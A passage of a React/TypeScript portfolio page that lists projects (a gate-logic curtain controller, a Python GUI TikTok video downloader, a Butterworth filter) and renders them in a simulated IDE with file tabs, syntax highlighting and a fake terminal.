  {
    id: "curtain",
    name: "Smart Curtain System",
    domain: "embedded",
    status: "archived",
    tags: ["digital-logic", "gates", "automation"],
    description: "Logic-gate-based smart curtain control system for automated opening and closing.",
    github: "",
    demo: "",
    image: "/assets/curtain.png",
    runCommand: "$ simulate curtain.logic",
    runOutput: [
      "[*] Truth table → 8 states",
      "[*] Inputs:  light_sensor, time_signal, manual_override",
      "[+] Outputs: motor_open, motor_close",
      "[*] Hazard-free Karnaugh: ✓",
    ],
    files: [
      {
        name: "README.md",
        lang: "md",
        content: `# Smart Curtain — Pure Gate Logic

No microcontroller. Just AND/OR/NOT gates wired to drive a motor based on
ambient light, time signal, and a manual override.

Designed by Karnaugh-map minimization to be hazard-free.
`,
      },
    ],
  },
  {
    id: "tiktok",
    name: "TikTok Media Downloader",
    domain: "ai",
    status: "archived",
    tags: ["http", "scraper", "python", "gui"],
    description: "Professional GUI tool for downloading TikTok videos without watermarks, with thumbnail preview and audio extraction.",
    github: "",
    demo: "/assets/tiktok.mp4",
    image: "/assets/tiktok.png",
    runCommand: "$ python3 tiktok_downloader_pro.py",
    runOutput: [
      "[*] Launching TikTok Video Downloader Pro...",
      "[*] API endpoint: https://www.tikwm.com/api/",
      "[+] GUI initialized",
      "[*] Ready to fetch and download...",
    ],
    files: [
      {
        name: "README.md",
        lang: "md",
        content: `# TikTok Media Downloader Pro

Professional GUI for downloading TikTok videos without watermark or ads.

## Features
- Modern customtkinter GUI with dynamic sizing
- Thumbnail preview with auto-resize
- Video info display (author, duration, likes, views)
- No-watermark download option
- Audio-only extraction
- Progress bar with real-time status

## Stack
- customtkinter (modern tkinter)
- Pillow (image handling)
- requests (API calls)
- tikwm.com API
`,
      },
      {
        name: "tiktok_downloader_pro.py",
        lang: "py",
        content: `
#!/usr/bin/env python3
"""
TikTok Video Downloader Pro (Personal Use)
-------------------------------------------
Ultimate GUI version: Modern theme, thumbnail preview, video info, audio download, and more.
Updated: Fully dynamic sizing—window starts at natural size based on content, expands/resizes fluidly.
Fixed: Removed problematic self.geometry("") to prevent TypeError; now relies purely on Tkinter's natural sizing.
Thumbnail resize now safely defaults to 200x200 if widget dimensions are invalid during early layout.
"""

import requests
import os
import sys
import customtkinter as ctk
from tkinter import messagebox, filedialog
from pathlib import Path
import threading
import re
from PIL import Image, ImageTk
import io

ctk.set_appearance_mode("System")  # "dark", "light", or "system"
ctk.set_default_color_theme("blue")

API_ENDPOINT = "https://www.tikwm.com/api/"

class TikTokDownloader(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.title("TikTok Video Downloader Pro 🔥")
        # No fixed geometry—window will size dynamically based on content
        self.minsize(500, 400)  # Minimum size for usability
        self.grid_rowconfigure(0, weight=1)
        self.grid_columnconfigure(0, weight=1)

        # Variables
        self.url_var = ctk.StringVar()
        self.output_var = ctk.StringVar(value=os.getcwd())
        self.no_watermark_var = ctk.BooleanVar(value=True)
        self.thumbnail_img = None
        self.video_info = {}

        self.setup_ui()
        # Ensure widgets are laid out for natural sizing
        self.update_idletasks()
        # Removed self.geometry("") to avoid TypeError

    def setup_ui(self):
        # Main frame with expanded padding for better scaling
        main_frame = ctk.CTkFrame(self)
        main_frame.grid(row=0, column=0, sticky="nsew", padx=20, pady=20)
        main_frame.grid_rowconfigure(6, weight=1)  # Let preview frame expand vertically
        main_frame.grid_columnconfigure(0, weight=1)  # Let main column expand horizontally

        # Title (centered, non-expanding)
        title_label = ctk.CTkLabel(main_frame, text="TikTok Video Downloader Pro", font=ctk.CTkFont(size=24, weight="bold"))
        title_label.grid(row=0, column=0, columnspan=3, pady=(0, 20), sticky="ew")

        # URL Input row—make it expand horizontally
        ctk.CTkLabel(main_frame, text="Enter TikTok Video URL:", font=ctk.CTkFont(size=14)).grid(row=1, column=0, sticky="w", pady=5)
        url_entry = ctk.CTkEntry(main_frame, textvariable=self.url_var, height=40, font=ctk.CTkFont(size=12))
        url_entry.grid(row=2, column=0, columnspan=2, pady=5, sticky="ew")

        # Fetch Button (right-aligned, fixed width)
        fetch_btn = ctk.CTkButton(main_frame, text="Fetch Info & Preview", font=ctk.CTkFont(size=12, weight="bold"),
                                  command=self.start_fetch, width=150, height=35)
        fetch_btn.grid(row=2, column=2, padx=(10, 0), pady=5, sticky="e")

        # Output Directory row—expanding
        ctk.CTkLabel(main_frame, text="Output Directory:", font=ctk.CTkFont(size=14)).grid(row=3, column=0, sticky="w", pady=(20,5))
        output_frame = ctk.CTkFrame(main_frame)
        output_frame.grid(row=4, column=0, columnspan=3, pady=5, sticky="ew")
        output_frame.grid_columnconfigure(0, weight=1)  # Entry expands
        ctk.CTkEntry(output_frame, textvariable=self.output_var, state="readonly").pack(side="left", fill="x", expand=True, padx=(0,10))
        ctk.CTkButton(output_frame, text="Choose Folder", command=self.choose_output_dir, width=100).pack(side="right")

        # Download Options (non-expanding)
        options_frame = ctk.CTkFrame(main_frame)
        options_frame.grid(row=5, column=0, columnspan=3, pady=10, sticky="ew")
        ctk.CTkCheckBox(options_frame, text="No Watermark (Recommended)", variable=self.no_watermark_var, command=self.toggle_watermark).pack(side="left", padx=10, pady=10)

        # Thumbnail & Info Panel—expands vertically and horizontally
        preview_frame = ctk.CTkFrame(main_frame)
        preview_frame.grid(row=6, column=0, columnspan=3, pady=10, sticky="nsew")
        preview_frame.grid_rowconfigure(0, weight=1)
        preview_frame.grid_columnconfigure(0, weight=1)
        self.thumbnail_label = ctk.CTkLabel(preview_frame, text="Preview will appear here after fetching info", fg_color="transparent")
        self.thumbnail_label.grid(row=0, column=0, sticky="nsew", padx=10, pady=10)
        self.info_label = ctk.CTkLabel(preview_frame, text="Video info will show here", font=ctk.CTkFont(size=12), anchor="w")
        self.info_label.grid(row=1, column=0, sticky="ew", padx=10, pady=(0,10))

        # Progress Bar—expands horizontally
        self.progress = ctk.CTkProgressBar(main_frame)
        self.progress.grid(row=7, column=0, columnspan=3, pady=10, sticky="ew")
        self.progress.set(0)

        # Status Label (expanding)
        self.status_label = ctk.CTkLabel(main_frame, text="Ready to fetch and download...", font=ctk.CTkFont(size=12), anchor="w")
        self.status_label.grid(row=8, column=0, columnspan=3, pady=5, sticky="ew")

        # Buttons frame—expanding
        button_frame = ctk.CTkFrame(main_frame)
        button_frame.grid(row=9, column=0, columnspan=3, pady=20, sticky="ew")
        button_frame.grid_columnconfigure(1, weight=1)  # Space between buttons
        self.download_btn = ctk.CTkButton(button_frame, text="Download Video 🚀", font=ctk.CTkFont(size=16, weight="bold"),
                                         command=self.start_download, width=150, height=40)
        self.download_btn.grid(row=0, column=0, padx=(0, 20))
        self.audio_btn = ctk.CTkButton(button_frame, text="Download Audio 🎵", font=ctk.CTkFont(size=16, weight="bold"),
                                       command=self.start_audio_download, width=150, height=40, state="disabled")
        self.audio_btn.grid(row=0, column=2)

        # Bind Enter to fetch
        url_entry.bind("<Return>", lambda e: self.start_fetch())

    def choose_output_dir(self):
        dir_path = filedialog.askdirectory(initialdir=self.output_var.get())
        if dir_path:
            self.output_var.set(dir_path)

    def clean_filename(self, filename: str, max_length: int = 100) -> str:
        cleaned = re.sub(r'[<>:"/\\\\|?*]', '', filename)
        if len(cleaned) > max_length:
            cleaned = cleaned[:max_length]
        return cleaned.strip() or "tiktok_item"

    def fetch_video_info(self, url: str):
        try:
            self.status_label.configure(text="Verifying URL and fetching info...")
            self.progress.start()  # Indeterminate for fetch
            self.download_btn.configure(state="disabled")
            self.audio_btn.configure(state="disabled")

            api_url = f"{API_ENDPOINT}?url={url}"
            r = requests.get(api_url, timeout=10)
            r.raise_for_status()
            data = r.json()

            if data.get("code") != 0 or "data" not in data:
                raise ValueError("Invalid response: Could not fetch video data.")

            self.video_info = data["data"]
            self.update_preview()
            self.audio_btn.configure(state="normal")
            self.download_btn.configure(state="normal")
            return True
        except Exception as e:
            messagebox.showerror("Error", f"Failed to fetch video info: {e}")
            self.reset_ui()
            return False
        finally:
            self.progress.stop()
            self.progress.set(0)

    def update_preview(self):
        # Show thumbnail (resizes dynamically if widget is fully laid out)
        cover_url = self.video_info.get("cover")
        if cover_url:
            try:
                resp = requests.get(cover_url, timeout=5)
                img = Image.open(io.BytesIO(resp.content))
                # Get current label dimensions safely
                self.update_idletasks()  # Ensure latest layout
                label_width = self.thumbnail_label.winfo_width()
                label_height = self.thumbnail_label.winfo_height()
                if label_width <= 1 or label_height <= 1:  # Fallback if not yet rendered
                    size = (200, 200)
                else:
                    thumb_size = min(label_width - 20, label_height - 20, 300)  # Cap at 300 for large windows
                    size = (thumb_size, thumb_size)
                img = img.resize(size, Image.Resampling.LANCZOS)
                self.thumbnail_img = ImageTk.PhotoImage(img)
                self.thumbnail_label.configure(image=self.thumbnail_img, text="")
            except Exception as e:
                print(f"Thumbnail load error: {e}")  # Silent fallback
                self.thumbnail_label.configure(text="Thumbnail unavailable")

        # Show info (multi-line, wraps if needed)
        info = self.video_info
        author = info.get("author", {}).get("nickname", "Unknown")
        duration = info.get("duration", 0)
        likes = info.get("digg_count", 0)
        views = info.get("play_count", 0)
        title = info.get("title", "No title")
        info_text = f"Author: {author}\\nDuration: {duration}s | Likes: {likes:,} | Views: {views:,}\\nTitle: {title}"
        self.info_label.configure(text=info_text)
        self.status_label.configure(text="Ready to download! ✅")

    def reset_ui(self):
        self.thumbnail_label.configure(image="", text="Preview will appear here after fetching info")
        self.info_label.configure(text="Video info will show here")
        self.audio_btn.configure(state="disabled")
        self.download_btn.configure(state="normal")
        self.progress.set(0)
        self.status_label.configure(text="Ready to fetch and download...")

    def toggle_watermark(self):
        pass  # UI toggle only

    def download_file(self, file_url: str, out_path: Path, is_audio: bool = False):
        try:
            self.status_label.configure(text="Downloading..." if not is_audio else "Downloading audio...")
            with requests.get(file_url, stream=True) as resp:
                resp.raise_for_status()
                total = int(resp.headers.get("Content-Length", 0))
                downloaded = 0
                chunk_size = 8192

                with open(out_path, "wb") as f:
                    for chunk in resp.iter_content(chunk_size=chunk_size):
                        if chunk:
                            f.write(chunk)
                            downloaded += len(chunk)
                            if total:
                                percent = (downloaded / total) * 100
                                self.progress.set(percent)
                                self.status_label.configure(text=f"Downloading... {percent:.1f}%")

            self.progress.set(100)
            self.status_label.configure(text="Download complete! ✅")
            return out_path
        except Exception as e:
            raise RuntimeError(f"Download failed: {e}")

    def start_fetch(self):
        url = self.url_var.get().strip()
        if not url:
            messagebox.showerror("Error", "Please enter a valid URL.")
            return
        threading.Thread(target=self.fetch_video_info, args=(url,), daemon=True).start()

    def start_download(self):
        if not self.video_info:
            messagebox.showwarning("Info Needed", "Please fetch video info first by clicking 'Fetch Info & Preview'.")
            return
        video_url = self.video_info["play"] if self.no_watermark_var.get() else self.video_info.get("wmplay", self.video_info["play"])
        self._download_thread(video_url, "mp4", "Video")

    def start_audio_download(self):
        if not self.video_info:
            messagebox.showwarning("Info Needed", "Please fetch video info first.")
            return
        music_url = self.video_info.get("music") or self.video_info.get("music_url", "")
        if not music_url:
            messagebox.showerror("Error", "Audio URL not available for this video.")
            return
        self._download_thread(music_url, "mp3", "Audio")

    def _download_thread(self, file_url: str, ext: str, name: str):
        url = self.url_var.get().strip()
        out_dir = Path(self.output_var.get())
        title = self.video_info.get("title", "tiktok_item")
        safe_name = self.clean_filename(title)
        out_path = out_dir / f"{safe_name}.{ext}"

        def download():
            try:
                saved_file = self.download_file(file_url, out_path, name.lower() == "audio")
                messagebox.showinfo("Success!", f"{name} saved to:\\n{saved_file.absolute()}")
                if messagebox.askyesno("Open Folder?", f"Open the output folder for the {name.lower()}?"):
                    if sys.platform == "win32":
                        os.startfile(out_dir.absolute())
                    else:
                        os.system(f"open '{out_dir.absolute()}'" if sys.platform == "darwin" else f"xdg-open '{out_dir.absolute()}'")
                self.reset_ui()  # Auto-reset for next use
            except Exception as e:
                messagebox.showerror("Error", str(e))
            finally:
                self.progress.set(0)

        threading.Thread(target=download, daemon=True).start()

if __name__ == "__main__":
    app = TikTokDownloader()
    app.mainloop(),
      },
    ],
  },
  {
    id: "butterworth",
    name: "3rd-Order Butterworth BPF",
    domain: "embedded",
    status: "archived",
    tags: ["analog", "butterworth", "filters"],
    description: "Passive 3rd-order Butterworth band-pass filter with flat passband.",
    github: "",
    demo: "/assets/filter3rd.mp4",
    image: "/assets/butterworth_bpf.jpeg",
    runCommand: "$ ngspice butterworth.cir -b",
    runOutput: [
      "Circuit: 3rd-order Butterworth BPF",
      "[*] f0 = 1.00 MHz   BW = 10 kHz",
      "[*] Pass-band ripple: ~0 dB (maximally flat)",
      "[*] Roll-off: -60 dB/decade",
    ],
    files: [
      {
        name: "README.md",
        lang: "md",
        content: `# 3rd-Order Butterworth Band-Pass

Maximally flat magnitude response. Center 1 MHz, bandwidth 10 kHz.

Filter order trades pass-band flatness for roll-off steepness — 3rd-order
is the sweet spot for most narrowband audio/RF stages.
`,
      },
    ],
  },
];

const DOMAIN_ICON = {
  security: Bug,
  embedded: Cpu,
  ai: Activity,
  networking: NetIcon,
} as const;

const STATUS_COLOR: Record<Project["status"], string> = {
  active: "bg-cyber-cyan",
  "in-progress": "bg-amber-400",
  archived: "bg-muted-foreground",
  private: "bg-cyber-violet",
};

const FILE_ICON = (lang: FileEntry["lang"]) => {
  if (lang === "md") return FileText;
  if (lang === "bash") return FileTerminal;
  return FileCode2;
};

const KEYWORDS: Record<FileEntry["lang"], string[]> = {
  py: ["def", "import", "from", "if", "elif", "else", "for", "while", "return", "with", "as", "in", "try", "except", "class", "True", "False", "None", "lambda", "and", "or", "not", "pass"],
  js: ["function", "const", "let", "var", "if", "else", "for", "while", "return", "import", "from", "export", "class", "new", "true", "false", "null", "undefined"],
  bash: ["if", "then", "else", "fi", "for", "do", "done", "while", "case", "esac", "function", "return", "in"],
  c: ["int", "void", "char", "float", "double", "if", "else", "for", "while", "return", "struct", "static", "const", "include", "define"],
  ino: ["void", "int", "char", "byte", "boolean", "if", "else", "for", "while", "return", "switch", "case", "break", "const", "include"],
  md: [],
  txt: [],
};

function highlight(line: string, lang: FileEntry["lang"]) {
  if (lang === "md") {
    if (/^#{1,6}\s/.test(line)) return <span className="text-cyber-cyan">{line}</span>;
    if (/^>\s/.test(line)) return <span className="text-muted-foreground italic">{line}</span>;
    if (/^```/.test(line)) return <span className="text-cyber-violet">{line}</span>;
    if (/^- /.test(line)) return <span><span className="text-cyber-violet">- </span>{line.slice(2)}</span>;
    return <span>{line}</span>;
  }
  if (lang === "txt") return <span>{line}</span>;

  const tokens: React.ReactNode[] = [];
  const re = /("[^"]*"|'[^']*'|#[^\n]*|\/\/[^\n]*|\b\d+\b|\b[A-Za-z_][A-Za-z0-9_]*\b|\s+|.)/g;
  let m;
  let i = 0;
  while ((m = re.exec(line)) !== null) {
    const t = m[0];
    let cls = "";
    if (/^"|^'/.test(t)) cls = "text-emerald-400";
    else if (/^#|^\/\//.test(t)) cls = "text-muted-foreground italic";
    else if (/^\d+$/.test(t)) cls = "text-amber-300";
    else if (KEYWORDS[lang].includes(t)) cls = "text-cyber-violet";
    else if (/^[A-Za-z_][A-Za-z0-9_]*$/.test(t) && line[re.lastIndex] === "(") cls = "text-cyber-cyan";
    tokens.push(cls ? <span key={i++} className={cls}>{t}</span> : t);
  }
  return <>{tokens}</>;
}

function ProjectsPage() {
  const [activeId, setActiveId] = useState<string>(PROJECTS[0].id);
  const [openTabs, setOpenTabs] = useState<Record<string, string[]>>({
    [PROJECTS[0].id]: [PROJECTS[0].files[0].name],
  });
  const [activeTab, setActiveTab] = useState<Record<string, string>>({
    [PROJECTS[0].id]: PROJECTS[0].files[0].name,
  });
  const [expanded, setExpanded] = useState<Set<string>>(new Set(["security"]));
  const [terminalLines, setTerminalLines] = useState<string[]>([
    "Mostafa Galal — workspace v1.0",
    'Type "help" or use the Run button to execute a project.',
    "",
  ]);
  const [running, setRunning] = useState(false);
  const [showPalette, setShowPalette] = useState(false);
  const [paletteQuery, setPaletteQuery] = useState("");
  const [mobileMenuOpen, setMobileMenuOpen] = useState(false);
  const terminalRef = useRef<HTMLDivElement>(null);

  const activeProject = PROJECTS.find((p) => p.id === activeId)!;
  const tabs = openTabs[activeId] ?? [];
  const currentTab = activeTab[activeId] ?? tabs[0];
  const currentFile = activeProject.files.find((f) => f.name === currentTab) ?? activeProject.files[0];

  useEffect(() => {
    const onKey = (e: KeyboardEvent) => {
      if ((e.ctrlKey || e.metaKey) && e.key.toLowerCase() === "p") {
        e.preventDefault();
        setShowPalette(true);
      }
      if (e.key === "Escape") {
        setShowPalette(false);
        setMobileMenuOpen(false);
      }
      if ((e.ctrlKey || e.metaKey) && e.key === "Tab") {
        e.preventDefault();
        const list = openTabs[activeId] ?? [];
        if (list.length > 1) {
          const idx = list.indexOf(currentTab);
          const next = list[(idx + 1) % list.length];
          setActiveTab((p) => ({ ...p, [activeId]: next }));
        }
      }
    };
    window.addEventListener("keydown", onKey);
    return () => window.removeEventListener("keydown", onKey);
  }, [openTabs, activeId, currentTab]);

  const openProject = (id: string) => {
    setActiveId(id);
    setMobileMenuOpen(false);
    const proj = PROJECTS.find((p) => p.id === id)!;
    setOpenTabs((prev) => ({
      ...prev,
      [id]: prev[id] ?? [proj.files[0].name],
    }));
    setActiveTab((prev) => ({
      ...prev,
      [id]: prev[id] ?? proj.files[0].name,
    }));
  };

  const openFile = (name: string) => {
    setOpenTabs((prev) => {
      const list = prev[activeId] ?? [];
      return list.includes(name) ? prev : { ...prev, [activeId]: [...list, name] };
    });
    setActiveTab((prev) => ({ ...prev, [activeId]: name }));
  };

  const closeTab = (name: string) => {
    setOpenTabs((prev) => {
      const list = (prev[activeId] ?? []).filter((n) => n !== name);
      return { ...prev, [activeId]: list };
    });
    if (currentTab === name) {
      const list = (openTabs[activeId] ?? []).filter((n) => n !== name);
      if (list.length) setActiveTab((p) => ({ ...p, [activeId]: list[list.length - 1] }));
    }
  };

  const runProject = async () => {
    setRunning(true);
    const header = [
      "",
      `~/projects/${activeProject.id} ${activeProject.runCommand}`,
    ];
    setTerminalLines((p) => [...p, ...header]);
    for (const line of activeProject.runOutput) {
      await new Promise((r) => setTimeout(r, 220));
      setTerminalLines((p) => [...p, line]);
      requestAnimationFrame(() => {
        terminalRef.current?.scrollTo({ top: terminalRef.current.scrollHeight });
      });
    }
    setTerminalLines((p) => [...p, ""]);
    setRunning(false);
  };

  const stopRun = () => setRunning(false);

  const toggleFolder = (key: string) => {
    setExpanded((prev) => {
      const next = new Set(prev);
      next.has(key) ? next.delete(key) : next.add(key);
      return next;
    });
  };

  const grouped = useMemo(() => {
    const byDomain: Record<string, Project[]> = {};
    PROJECTS.forEach((p) => {
      (byDomain[p.domain] ??= []).push(p);
    });
    return byDomain;
  }, []);

  const paletteResults = useMemo(() => {
    const q = paletteQuery.toLowerCase().trim();
    if (!q) return PROJECTS.slice(0, 8);
    return PROJECTS.filter(
      (p) =>
        p.name.toLowerCase().includes(q) ||
        p.tags.some((t) => t.includes(q)) ||
        p.domain.includes(q)
    ).slice(0, 8);
  }, [paletteQuery]);

  const lines = currentFile.content.split("\n");
  const vulnSet = new Set(activeProject.vulnLines ?? []);

  return (
    <div className="mx-auto max-w-7xl px-4 py-12 sm:px-6">
      <Reveal>
        <div className="max-w-3xl">
          <div className="inline-flex items-center gap-2 font-mono text-xs uppercase tracking-[0.25em] text-cyber-cyan">
            <span className="h-px w-8 bg-gradient-to-r from-cyber-cyan to-transparent" />
            workspace::open
          </div>
          <h1 className="mt-3 font-display text-3xl font-bold leading-tight sm:text-4xl">
            Live engineering <span className="text-gradient-cyber">workspace</span>
          </h1>
          <p className="mt-3 text-sm leading-relaxed text-muted-foreground">
            Real repos, real files, real terminal. Click a project, browse its files, hit
            <kbd className="mx-1 rounded border border-border bg-muted px-1.5 py-0.5 font-mono text-[10px]">Run</kbd>
            to simulate execution, or
            <kbd className="mx-1 rounded border border-border bg-muted px-1.5 py-0.5 font-mono text-[10px]">⌘P</kbd>
            to jump.
          </p>
        </div>
      </Reveal>

      {/* Mobile Project Selector */}
      <div className="mt-6 lg:hidden">
        <button
          onClick={() => setMobileMenuOpen(!mobileMenuOpen)}
          className="flex w-full items-center justify-between rounded-xl border border-glass-border bg-black/40 px-4 py-3"
        >
          <div className="flex items-center gap-3">
            <Menu className="h-4 w-4 text-cyber-cyan" />
            <span className="font-mono text-sm text-foreground">{activeProject.name}</span>
            <span className={cn("h-2 w-2 rounded-full", STATUS_COLOR[activeProject.status])} />
          </div>
          <ChevronDown className={cn("h-4 w-4 text-muted-foreground transition-transform", mobileMenuOpen && "rotate-180")} />
        </button>

        <AnimatePresence>
          {mobileMenuOpen && (
            <motion.div
              initial={{ height: 0, opacity: 0 }}
              animate={{ height: "auto", opacity: 1 }}
              exit={{ height: 0, opacity: 0 }}
              transition={{ duration: 0.2 }}
              className="overflow-hidden"
            >
              <div className="mt-2 max-h-80 overflow-y-auto rounded-xl border border-glass-border bg-black/60 p-2">
                {PROJECTS.map((p) => {
                  const Icon = DOMAIN_ICON[p.domain];
                  return (
                    <button
                      key={p.id}
                      onClick={() => openProject(p.id)}
                      className={cn(
                        "flex w-full items-center gap-3 rounded-lg px-3 py-2.5 text-left transition-colors",
                        p.id === activeId
                          ? "bg-cyber-cyan/10 text-foreground"
                          : "text-foreground/80 hover:bg-muted/30"
                      )}
                    >
                      <Icon className="h-4 w-4 text-cyber-cyan" />
                      <span className="flex-1 text-sm font-medium">{p.name}</span>
                      <span className={cn("h-1.5 w-1.5 rounded-full", STATUS_COLOR[p.status])} />
                    </button>
                  );
                })}
              </div>
            </motion.div>
          )}
        </AnimatePresence>
      </div>

      {/* IDE shell */}
      <div
        className="mt-4 overflow-hidden rounded-2xl ring-1 ring-glass-border lg:mt-8"
        style={{ background: "oklch(0.10 0.02 265 / 0.92)" }}
      >
        {/* title bar */}
        <div className="flex items-center justify-between gap-3 border-b border-glass-border/60 bg-black/40 px-3 py-2">
          <div className="flex items-center gap-1.5">
            <span className="h-2.5 w-2.5 rounded-full bg-rose-500/70" />
            <span className="h-2.5 w-2.5 rounded-full bg-amber-400/70" />
            <span className="h-2.5 w-2.5 rounded-full bg-emerald-400/70" />
            <span className="ml-3 font-mono text-[11px] text-muted-foreground">
              mostafa-galal · workspace — {activeProject.name}
            </span>
          </div>
          <div className="hidden items-center gap-2 sm:flex">
            <button
              onClick={() => setShowPalette(true)}
              className="inline-flex items-center gap-2 rounded-md border border-border bg-black/30 px-2.5 py-1 font-mono text-[10px] text-muted-foreground hover:text-foreground"
            >
              <Search className="h-3 w-3" />
              jump to project
              <kbd className="ml-2 rounded border border-border px-1 text-[9px]">⌘P</kbd>
            </button>
          </div>
        </div>

        <div className="grid h-[520px] grid-cols-1 lg:h-[600px] lg:grid-cols-[220px_1fr_240px]">
          {/* file tree — desktop only */}
          <aside className="hidden overflow-y-auto border-r border-glass-border/60 bg-black/30 p-2 lg:block">
            <div className="px-2 pb-2 font-mono text-[10px] uppercase tracking-[0.25em] text-cyber-cyan">
              explorer
            </div>
            {Object.entries(grouped).map(([domain, items]) => {
              const Icon = DOMAIN_ICON[domain as keyof typeof DOMAIN_ICON];
              const isOpen = expanded.has(domain);
              return (
                <div key={domain} className="mb-1">
                  <button
                    onClick={() => toggleFolder(domain)}
                    className="flex w-full items-center gap-1 rounded px-1.5 py-1 text-left hover:bg-muted/30"
                  >
                    <ChevronRight
                      className={cn("h-3 w-3 text-muted-foreground transition-transform", isOpen && "rotate-90")}
                    />
                    {isOpen ? <FolderOpen className="h-3.5 w-3.5 text-amber-400/80" /> : <Folder className="h-3.5 w-3.5 text-amber-400/60" />}
                    <span className="font-mono text-[11px] uppercase tracking-wider text-foreground/90">{domain}/</span>
                    <Icon className="ml-auto h-3 w-3 text-muted-foreground" />
                  </button>
                  {isOpen && (
                    <ul className="ml-4 mt-0.5 space-y-0.5">
                      {items.map((p) => {
                        const isActive = p.id === activeId;
                        const isOpened = expanded.has(`p:${p.id}`);
                        return (
                          <li key={p.id}>
                            <div className="flex items-center">
                              <button
                                onClick={() => toggleFolder(`p:${p.id}`)}
                                className="grid h-5 w-5 place-items-center text-muted-foreground hover:text-foreground"
                              >
                                <ChevronRight className={cn("h-3 w-3 transition-transform", isOpened && "rotate-90")} />
                              </button>
                              <button
                                onClick={() => openProject(p.id)}
                                className={cn(
                                  "flex flex-1 items-center gap-1.5 rounded px-1.5 py-1 text-left",
                                  isActive ? "bg-cyber-cyan/10 text-foreground" : "text-foreground/85 hover:bg-muted/30"
                                )}
                              >
                                {p.status === "private" ? (
                                  <Lock className="h-3 w-3 text-cyber-violet" />
                                ) : (
                                  <Folder className="h-3 w-3 text-amber-400/70" />
                                )}
                                <span className="truncate font-mono text-[11px]">{p.id}</span>
                                <span className={cn("ml-auto h-1.5 w-1.5 rounded-full", STATUS_COLOR[p.status])} />
                              </button>
                            </div>
                            {isOpened && (
                              <ul className="ml-7 mt-0.5 space-y-0.5">
                                {p.files.map((f) => {
                                  const FIcon = FILE_ICON(f.lang);
                                  const fileActive = isActive && currentTab === f.name;
                                  return (
                                    <li key={f.name}>
                                      <button
                                        onClick={() => {
                                          openProject(p.id);
                                          openFile(f.name);
                                        }}
                                        className={cn(
                                          "flex w-full items-center gap-1.5 rounded px-1.5 py-0.5 text-left",
                                          fileActive ? "text-cyber-cyan" : "text-muted-foreground hover:text-foreground"
                                        )}
                                      >
                                        <FIcon className="h-3 w-3" />
                                        <span className="truncate font-mono text-[11px]">{f.name}</span>
                                      </button>
                                    </li>
                                  );
                                })}
                              </ul>
                            )}
                          </li>
                        );
                      })}
                    </ul>
                  )}
                </div>
              );
            })}
          </aside>

          {/* center: editor + terminal */}
          <main className="flex min-w-0 flex-col">
            {/* tabs */}
            <div className="flex items-center gap-1 overflow-x-auto border-b border-glass-border/60 bg-black/40 px-2 py-1">
              <AnimatePresence>
                {tabs.map((name) => {
                  const f = activeProject.files.find((x) => x.name === name)!;
                  const FIcon = FILE_ICON(f.lang);
                  const isActiveTab = name === currentTab;
                  return (
                    <motion.div
                      key={name}
                      initial={{ opacity: 0, y: -4 }}
                      animate={{ opacity: 1, y: 0 }}
                      exit={{ opacity: 0, y: -4 }}
                      transition={{ duration: 0.15 }}
                      className={cn(
                        "group inline-flex shrink-0 items-center gap-1.5 rounded-t-md border-x border-t px-2.5 py-1 font-mono text-[11px]",
                        isActiveTab
                          ? "border-glass-border bg-black/60 text-foreground"
                          : "border-transparent text-muted-foreground hover:text-foreground"
                      )}
                    >
                      <button onClick={() => setActiveTab((p) => ({ ...p, [activeId]: name }))} className="inline-flex items-center gap-1.5">
                        <FIcon className={cn("h-3 w-3", isActiveTab && "text-cyber-cyan")} />
                        <span className="max-w-[100px] truncate sm:max-w-[140px]">{name}</span>
                      </button>
                      {tabs.length > 1 && (
                        <button
                          onClick={() => closeTab(name)}
                          className="opacity-0 transition-opacity group-hover:opacity-100 hover:text-rose-400"
                        >
                          <X className="h-3 w-3" />
                        </button>
                      )}
                    </motion.div>
                  );
                })}
              </AnimatePresence>

              <div className="ml-auto flex items-center gap-1 pr-1">
                <button
                  onClick={running ? stopRun : runProject}
                  disabled={running}
                  className={cn(
                    "inline-flex items-center gap-1.5 rounded-md px-2.5 py-1 font-mono text-[10px] uppercase tracking-wider transition-all",
                    running
                      ? "bg-rose-500/15 text-rose-400 ring-1 ring-rose-500/40"
                      : "bg-emerald-500/15 text-emerald-400 ring-1 ring-emerald-500/40 hover:bg-emerald-500/25"
                  )}
                >
                  {running ? <Stop className="h-3 w-3" /> : <Play className="h-3 w-3" />}
                  {running ? "running" : "run"}
                </button>
              </div>
            </div>

            {/* editor */}
            <div className="flex-1 overflow-auto bg-black/50 font-mono text-[12px] leading-[1.55]">
              <pre className="m-0 flex">
                <code className="select-none border-r border-glass-border/40 px-3 py-3 text-right text-muted-foreground/50">
                  {lines.map((_, i) => (
                    <div key={i}>{i + 1}</div>
                  ))}
                </code>
                <code className="block flex-1 px-4 py-3 text-foreground/95">
                  {lines.map((line, i) => {
                    const lineNo = i + 1;
                    const isVuln = vulnSet.has(lineNo) && (currentFile.lang === "py" || currentFile.lang === "c");
                    return (
                      <div
                        key={i}
                        className={cn(
                          "relative",
                          isVuln && "bg-rose-500/[0.08] before:absolute before:left-0 before:top-0 before:h-full before:w-0.5 before:bg-rose-500"
                        )}
                      >
                        {highlight(line || " ", currentFile.lang)}
                        {isVuln && (
                          <span className="ml-3 rounded bg-rose-500/15 px-1.5 py-0.5 font-mono text-[9px] uppercase tracking-wider text-rose-400">
                            ! sec-note
                          </span>
                        )}
                      </div>
                    );
                  })}
                </code>
              </pre>
            </div>

            {/* terminal */}
            <div className="border-t border-glass-border/60 bg-black/70">
              <div className="flex items-center justify-between border-b border-glass-border/40 px-3 py-1.5">
                <div className="inline-flex items-center gap-1.5 font-mono text-[10px] uppercase tracking-[0.2em] text-cyber-cyan">
                  <TerminalSquare className="h-3 w-3" />
                  terminal · /bin/bash
                </div>
                <button
                  onClick={() => setTerminalLines(["cleared.", ""])}
                  className="font-mono text-[10px] uppercase tracking-wider text-muted-foreground hover:text-foreground"
                >
                  clear
                </button>
              </div>
              <div ref={terminalRef} className="h-36 overflow-y-auto px-3 py-2 font-mono text-[11px] leading-relaxed lg:h-44">
                {terminalLines.map((l, i) => (
                  <div
                    key={i}
                    className={cn(
                      l.startsWith("[+]") && "text-emerald-400",
                      l.startsWith("[!]") && "text-rose-400",
                      l.startsWith("[*]") && "text-cyber-cyan",
                      l.startsWith("$") || l.startsWith("~/") ? "text-foreground" : "",
                      !l.match(/^[\[\$~]/) && "text-muted-foreground"
                    )}
                  >
                    {l}
                  </div>
                ))}
                {running && (
                  <div className="text-cyber-cyan">
                    <span className="inline-block h-2 w-2 animate-pulse rounded-sm bg-cyber-cyan" />
                  </div>
                )}
              </div>
            </div>

